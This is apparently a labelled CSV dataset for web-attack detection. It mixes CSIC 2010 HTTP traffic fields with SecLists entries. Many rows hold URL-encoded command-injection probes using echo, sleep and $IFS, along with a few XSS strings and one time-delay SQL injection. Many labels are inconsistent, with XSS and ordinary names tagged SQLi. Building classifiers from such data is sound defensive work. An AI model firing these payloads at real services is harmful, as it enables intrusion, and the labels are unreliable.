payload,label,source
"modo=registro&login=shayanpo&password=P40A1A&nombre=Luis+Gonzaga&apellidos=Vogue+Carrasco&email=longdon.unkel@mirallesmoscardo.sb&dni=95328291F&direccion=Yuca+52,+&ciudad=Calldetenes&cp=42112&provincia=Lugo&ntc=0908237310921471&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
E7D4ACFAB333AADEFDA94950B0A9B85E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%26echo%20SSASTK$((41%2B1))$(echo%20SSASTK)SSASTK&,CMD,seclists_cmd
65BD0B93ECAAD61F46D99A8C6A6146F2,Normal,csic_gsi:cisc_normalTraffic_test.txt
423C1722B8435EA89B3DA3792CA76124,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ITUCTB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
84E260B6C98E5FBC50F54C0E4B9FDCE3,Normal,csic_gsi:cisc_normalTraffic_test.txt
Palacios+del+Arzobispo,Normal,csic_gsi:cisc_normalTraffic_train.txt
"183','0','0');waitfor+delay+'0:0:15';--",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D9A0A7B86A9C0535FBF8B0CA07D78129,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Plaza+Doctor+Quemada+88+8-H,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XGXYKB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,CMD,seclists_cmd
Deidamia,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
03AF647A5F68722B758A7E87D603DAED,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
45971A9D3492B80A234BB0C2E5C76C29,Normal,csic_gsi:cisc_normalTraffic_test.txt
Sanmarti+Challiol,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
roderick@juguetespersonales.ck,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6414725645609263,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%7C%20%5B%204%20-ne%20%24%28echo%20UUMIWO%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
%22%3B%20str%3D%24%28echo%20VJZVXS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20,CMD,seclists_cmd
"<BR SIZE=""&{alert('XSS')}"">",SQLi,community:payloads_seed
%2527%7C%20%5B%208%20-ne%20%24%28echo%20SBHMIY%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,CMD,seclists_cmd
Salas+de+los+Infantes,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0DCAE174F3C9BF3D4B6AE1866E88178D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
stormy,Normal,csic_gsi:cisc_normalTraffic_train.txt
chatinover@prestoesesto.zm,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
70806659D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0A83A1A66C507D028FE98E661AA9DC47,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=5191&B1=Confirmar/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26echo$IFSEHCFWA$((81%2B0))$(echo$IFSEHCFWA)EHCFWA%27,CMD,seclists_cmd
%26echo$IFSRAALVW$((18%2B87))$(echo$IFSRAALVW)RAALVW%26,CMD,seclists_cmd
B122D9A95C98B4A7287032C5410D37DF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0710F908DC145E83CC02051C5F6D82F7,Normal,csic_gsi:cisc_normalTraffic_train.txt
5BE954BE650F73EC80F53F32505A11A0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7309BB6371D406628D1DEAA89C0E0210,Normal,csic_gsi:cisc_normalTraffic_train.txt
EA0578B5D78D9C6D5C5DA49BDFF23143,Normal,csic_gsi:cisc_normalTraffic_test.txt
3742387438477895,Normal,csic_gsi:cisc_normalTraffic_test.txt
4B17D10BD481F545C56D5F0092779268,Normal,csic_gsi:cisc_normalTraffic_train.txt
BC79AF2B4A7DABFD86343602570E4217,Normal,csic_gsi:cisc_normalTraffic_train.txt
new,Normal,csic_gsi:cisc_normalTraffic_train.txt
1ACEE6A3CB4CC432A45D2839FD99A712,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%26%26echo%20FXNWMX$((79%2B34))$(echo%20FXNWMX)FXNWMX%27,CMD,seclists_cmd
C994F73D0ABD248B74ECC85C7EF2AC07,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
223234235BF13DFC25BA6B4F220203C8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
51E0C98150B59B76657661170688030F,Normal,csic_gsi:cisc_normalTraffic_test.txt
Cabrera+Noguera,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
CD59CECFA1AE51F89972D8B704245151,Normal,csic_gsi:cisc_normalTraffic_test.txt
echo%20IFNPXI$((40%2B99))$(echo%20IFNPXI)IFNPXI',CMD,seclists_cmd
8A534EDC382A5D3627A79CDF13F8FABC,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5E208E5E28255DA6CF728C6DC348A1B6,Normal,csic_gsi:cisc_normalTraffic_train.txt
A2592329756FEE6BEA805DC165F94079,Normal,csic_gsi:cisc_normalTraffic_test.txt
6C606E584F6B35F17DD467CB99F7C350,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=registro&login=oam&password=_vEj�N&nombre=Flora&apellidos=Avell�&email=barczy@menorca.com.ua&dni=39712087B&direccion=Avda.+Pampaneira+49+&ciudad=Herguijuela&cp=08519&provincia=Cuenca&ntc=4828416855621815&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
Desamparados,Normal,csic_gsi:cisc_normalTraffic_train.txt
03F7CCC5E920C23214AAFB1C852BAD39,Normal,csic_gsi:cisc_normalTraffic_test.txt
4694731607797845,Normal,csic_gsi:cisc_normalTraffic_test.txt
"C/+Antonio+Salvador,+18,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
1116B4D0FC70A41D621087CC135316A0,Normal,csic_gsi:cisc_normalTraffic_train.txt
"<IMG SRC=""javascript:alert('XSS')",XSS,community:payloads_seed
modo=insertar&precio=1366&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
C4212CE9384EBC4FA908BFEB3FC4EF3F,Normal,csic_gsi:cisc_normalTraffic_train.txt
v2e2udO,Normal,csic_gsi:cisc_normalTraffic_train.txt
kriz,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%203%20-ne%20%24%28echo%20PCTUKX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
1669337364255501,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%7C%20%5B%205%20-ne%20%24%28echo%20OYYPMX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
${passthru(print(`echo%20OSWWFT%0aecho%20$((92%2B42))%0aecho%20OSWWFT%0aecho%20OSWWFT`)%3B%252529%25257DOSWWFT,CMD,seclists_cmd
92A779C212B09D73F4C3776C15F4EFC2,Normal,csic_gsi:cisc_normalTraffic_train.txt
41A572FB4B3B7AA023212C62388F2EE4,Normal,csic_gsi:cisc_normalTraffic_test.txt
042B3D1B3358548665765AAD2E526E18,Normal,csic_gsi:cisc_normalTraffic_test.txt
"""&echo%20IBIYQC$((4%2B38))$(echo%20IBIYQC)IBIYQC",CMD,seclists_cmd
%7C%20%5B%209%20-ne%20%24%28echo%20AJEWOJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
647BEDF58A9744B8675705CE9F2DF246,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20WSZRIR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20XNKLKW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,seclists_cmd
CD24EE29CBA913B33B5FA5C69E268311,Normal,csic_gsi:cisc_normalTraffic_train.txt
3E8E3141D02E89E531C5BFB373CC1968,Normal,csic_gsi:cisc_normalTraffic_test.txt
B28C95E7F0BE2779CF1AB740CB6D71FE,Normal,csic_gsi:cisc_normalTraffic_test.txt
CC55DF5E77250E85125ABC00685D46F2,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20YUQKED%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27,CMD,seclists_cmd
tAs9GO,Normal,csic_gsi:cisc_normalTraffic_train.txt
607356A184D893354107937329B5D8F3,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20DRVINS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
8D026F021E8A306243D72E5E16564189,Normal,csic_gsi:cisc_normalTraffic_test.txt
D175AABABCBA8B97AAC7C3582F450D2B,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%0A%20str%3D%24%28echo%20WUDXTS%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
%2522%7C%20%5B%203%20-ne%20%24%28echo%20JLFVEC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,seclists_cmd
B2=%00,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=qinghui&password=disterminar&nombre=Nadra&apellidos=Busquets+Baduell&email=lillo_funk@inoxled.ma&dni=22652909W&direccion=C/+Codigo+Correspondencia+Oficial+Correos-telegrafos,+42+13-B&ciudad=Peralta+de+Alcofea&cp=47814&provincia=V+iz+caya&ntc=5583449016514744&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
08F2FC8666A5528B4A19E5BAE098F8BE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C28D57083FA32F8D0E581D9D30C6E035,Normal,csic_gsi:cisc_normalTraffic_test.txt
D999577A8155340A41A7BBBE5F6EF997,Normal,csic_gsi:cisc_normalTraffic_train.txt
Jardi,Normal,csic_gsi:cisc_normalTraffic_train.txt
Bri�as,Normal,csic_gsi:cisc_normalTraffic_train.txt
021B70FCE8F92510492439BAAF82597D,Normal,csic_gsi:cisc_normalTraffic_test.txt
60,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=8041&B1=Pasar+por+caja/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20ECBRPQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//,SQLi,community:payloads_seed
43B573EF095A5563B8CF7635C5458565,Normal,csic_gsi:cisc_normalTraffic_train.txt
9A18D58B5F19D8C5BAB6534525B83D11,Normal,csic_gsi:cisc_normalTraffic_train.txt
B1622DA179A37C235E39BE2887267CD9,Normal,csic_gsi:cisc_normalTraffic_train.txt
eNFasTiAr,Normal,csic_gsi:cisc_normalTraffic_test.txt
65DAA902261882A966A0F9E4656942AC,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Jer�nimo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ECCC457C04A73D584A0FCD65FB738E45,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XTMPBT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
E6B4D7E11BFDB35049B711DB5D893FFC,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20HSDBTA%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526,CMD,seclists_cmd
bartosze,Normal,csic_gsi:cisc_normalTraffic_test.txt
4A7653D1B32C3299299E3D10CD23C571,Normal,csic_gsi:cisc_normalTraffic_test.txt
De+Castro+W�lker,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Zempoalteca+Fuxet,Normal,csic_gsi:cisc_normalTraffic_train.txt
F7448C2C872EC7ACAD7F6427A969F733,SQLi,community:payloads_seed
422R0CE5a8E67,Normal,csic_gsi:cisc_normalTraffic_test.txt
61FAFC9948A393586D18EE81528CF24F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
07899E79A08CF57FFEDE99A642ED5269,Normal,csic_gsi:cisc_normalTraffic_test.txt
5F661C7B1D1346E257FDA53DBADA87FB,Normal,csic_gsi:cisc_normalTraffic_train.txt
marks,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%0A%20str%3D%24%28echo%20BHVRST%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
3e91au34lla3,Normal,csic_gsi:cisc_normalTraffic_test.txt
2D24FC3CEB465FBB8BAD5DA8898560BA,Normal,csic_gsi:cisc_normalTraffic_train.txt
yale,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20NFRBHV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
C14CD8C1C330465D13FB190C222BE973,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%0A%20str%3D%24%28echo%20VYCNRP%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%22,CMD,seclists_cmd
%2527%3B%20str%3D%24%28echo%20NSSNST%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C,CMD,seclists_cmd
4BBCAD7A56C11C405E78C457A3C21AB7,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%0A%20str%3D%24%28echo%20ROWALZ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20QOFXCY%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
Guillermo,Normal,csic_gsi:cisc_normalTraffic_test.txt
6133A8751F70FD1716F59D70DD5EE8B5,Normal,csic_gsi:cisc_normalTraffic_test.txt
0B3E325DCE33D11627E7E9279AED2768,Normal,csic_gsi:cisc_normalTraffic_train.txt
320FC94A717ADA950621EEC362F6F245,Normal,csic_gsi:cisc_normalTraffic_test.txt
A4E34BCE27803E2913421221A15EDF2B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20JMUDMJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%22,CMD,seclists_cmd
01364603J,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4DB2FEDE0E369C618B1C9533629572C9,Normal,csic_gsi:cisc_normalTraffic_train.txt
tasajo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5744A932DB42E9D4622C018D22464C52,Normal,csic_gsi:cisc_normalTraffic_test.txt
46DD8E8CB94DAC06CAFE874A03E1215B,Normal,csic_gsi:cisc_normalTraffic_train.txt
A3CDBE6BEF5690ED7C3D3B57ECDC1E18,Normal,csic_gsi:cisc_normalTraffic_test.txt
D872B1F26053C55023BDDD055D909EDD,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=tappert5&password=a627o07ta&nombre=Romildo&apellidos=Russell+Barrio&emailA=guilfoyle@santacruzdelvoto.tl&dni=40052504M&direccion=Calle+Del+Litio+143,+&ciudad=Unciti&cp=18565&provincia=Zamora&ntc=8140611124305673&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B40E82BFD4BF85DC65475F6ED5423444,Normal,csic_gsi:cisc_normalTraffic_test.txt
Roc�o+Azul,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B29A9EDAFA4A842F1D11554F52699F09,Normal,csic_gsi:cisc_normalTraffic_test.txt
Casia,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Calle+Cati+0,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
29BDC1A4215FA40AC619614130C4A037,Normal,csic_gsi:cisc_normalTraffic_train.txt
801BA1A3F38BF71653311BAC027F4469,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20NSNYEU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
modo=insertar&precio=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B3B23690DBAD9076244E963990BA394E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%202%20-ne%20%24%28echo%20NMWJXY%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
Plutarco,Normal,csic_gsi:cisc_normalTraffic_train.txt
61D2ACA28BBB5997285030B4B66C98FD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6CA18C281D4953540307DF3F1B53FB95,Normal,csic_gsi:cisc_normalTraffic_train.txt
31AC00CC5E319F88D6228BFA04596B96,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%207%20-ne%20%24%28echo%20LQRKBX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C,CMD,seclists_cmd
19268,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1%3F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Fabrica+Roja,+140+11?G",Normal,csic_gsi:cisc_normalTraffic_test.txt
;echo$IFSCGVCXZ$((66%2B61))$(echo$IFSCGVCXZ)CGVCXZ,CMD,seclists_cmd
Castellote,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20BRBPJX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
%7C%20%5B%209%20-ne%20%24%28echo%20MUMUQI%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,CMD,seclists_cmd
%27%7C%20%5B%202%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
4F8E28F643212BD1A8E725B3ED26C4A1,Normal,csic_gsi:cisc_normalTraffic_train.txt
B5013AEF51592D8397E6E5E9FFB0C7C4,Normal,csic_gsi:cisc_normalTraffic_test.txt
C8C6DAFD6B65C3A087592F3371002506,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BBAFA6460699BEAE3EE9218FD0D12479,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
40DB73DFBBEA05C849FE09F059552694,Normal,csic_gsi:cisc_normalTraffic_train.txt
71F19D02952B02963593F1C5E66FF254,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
39712087B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7AAC8CA409D92E6A284A4F529A61572A,Normal,csic_gsi:cisc_normalTraffic_test.txt
acinta,Normal,csic_gsi:cisc_normalTraffic_test.txt
orea/nt/e,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
50FB2FB5CBF3DE3637C21D5EB02E10B4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3C3DDE4DECA17D3B5A147BA51D36A8BC,Normal,csic_gsi:cisc_normalTraffic_train.txt
""".print(`echo%20COYIQB`.`echo%20$((70%2B26))`.`echo%20COYIQB`.`echo%20COYIQB`)%3BCOYIQB",CMD,seclists_cmd
%22%0A%20str%3D%24%28echo%20RSPYHG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
Lamec,Normal,csic_gsi:cisc_normalTraffic_test.txt
Villamandos,Normal,csic_gsi:cisc_normalTraffic_test.txt
C619B9AD71F31DAEDA1306F47E91228B,Normal,csic_gsi:cisc_normalTraffic_test.txt
B16A2562680865FEB187771AF704FD0D,Normal,csic_gsi:cisc_normalTraffic_test.txt
C78F596E72E031044A9E4C14DB29063B,Normal,csic_gsi:cisc_normalTraffic_train.txt
D265434AA78120FB1FAB4D4FD5AE3151,Normal,csic_gsi:cisc_normalTraffic_train.txt
Aldehuela+de+Peri��ez,Normal,csic_gsi:cisc_normalTraffic_test.txt
0173606595958509,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Avda.+Augusto+Vazquez,+42,+1E",Normal,csic_gsi:cisc_normalTraffic_train.txt
%7Cecho$IFSBJUKKI$((91%2B15))$(echo$IFSBJUKKI)BJUKKI%7C,CMD,seclists_cmd
Pozaldez,Normal,csic_gsi:cisc_normalTraffic_train.txt
F652D07879C8CF5765F159FCC27EFF8B,Normal,csic_gsi:cisc_normalTraffic_test.txt
89280F4C258169422D1F42AED745F3D8,Normal,csic_gsi:cisc_normalTraffic_train.txt
&&echo%20FOJNEL$((64%2B8))$(echo%20FOJNEL)FOJNEL,CMD,seclists_cmd
EBBE5FF59E3F0F9E9DEDF7ABDDCE77E8,Normal,csic_gsi:cisc_normalTraffic_train.txt
Gisberto,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2D5246BF41028A75BE9A90D9DE9F6E4A,Normal,csic_gsi:cisc_normalTraffic_train.txt
A47887D70F60AA84275553092BEC7397,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
175C57A5829C4735C2ECCB1DFD71F919,Normal,csic_gsi:cisc_normalTraffic_test.txt
mccormack@neotelecom.tn,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20YTWFPG%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
